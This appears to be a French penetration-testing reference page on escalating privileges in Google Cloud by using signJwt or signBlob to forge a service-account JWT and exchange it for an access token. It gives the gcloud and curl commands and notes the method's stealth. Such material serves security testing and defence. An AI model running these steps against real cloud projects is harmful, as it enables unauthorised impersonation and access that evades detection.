---
title: "signJwt et signBlob : forger un jeton en tant que compte de service"
description: "Forger un JWT auto-signé ou une signature arbitraire en tant que compte de service avec iam.serviceAccounts.signJwt et signBlob, puis l'échanger contre un jeton."
keywords:
  - signJwt
  - signBlob
  - JWT
  - signature
  - compte de service
---

# signJwt et signBlob

`iam.serviceAccounts.signJwt` signe un JWT avec la clé gérée par Google du compte de service cible, et `signBlob` signe des octets arbitraires. L'un ou l'autre vous permet de produire un identifiant que le compte n'a jamais émis : élaborez un JWT avec un `aud` choisi et échangez-le au point de terminaison de jetons OAuth contre un jeton d'accès en tant que cible.

## Forger un JWT et l'échanger

```bash
# sign a JWT claiming the target as issuer/subject, aud = the token endpoint
gcloud iam service-accounts sign-jwt --iam-account <target>@<proj>.iam.gserviceaccount.com \
  claim.json signed.jwt
# claim.json: {"iss":"<target>@...","sub":"<target>@...","aud":"https://oauth2.googleapis.com/token","scope":"https://www.googleapis.com/auth/cloud-platform","iat":...,"exp":...}

# exchange the signed JWT for an access token as the target
curl -s https://oauth2.googleapis.com/token \
  -d grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer \
  -d assertion=$(cat signed.jwt)
```

## Notes d'exploitation

- `signJwt` suffit à lui seul : vous n'avez jamais besoin de la clé privée de la cible, seulement de la permission.
- `signBlob` est de plus bas niveau (signer n'importe quels octets) et atteint le même résultat en signant un JWT à la main, et forge aussi des choses comme des URL GCS signées.
- Il s'agit d'une alternative plus discrète à la création de clé : aucun objet clé à longue durée de vie n'est laissé derrière.

## Outils

- **gcloud** (`iam service-accounts sign-jwt`).

## Références

- [Rhino Security Labs : escalade de privilèges GCP (partie 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Escalade de privilèges GCP IAM (dépôt Rhino)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Google : référence sign-jwt](https://cloud.google.com/sdk/gcloud/reference/iam/service-accounts/sign-jwt)
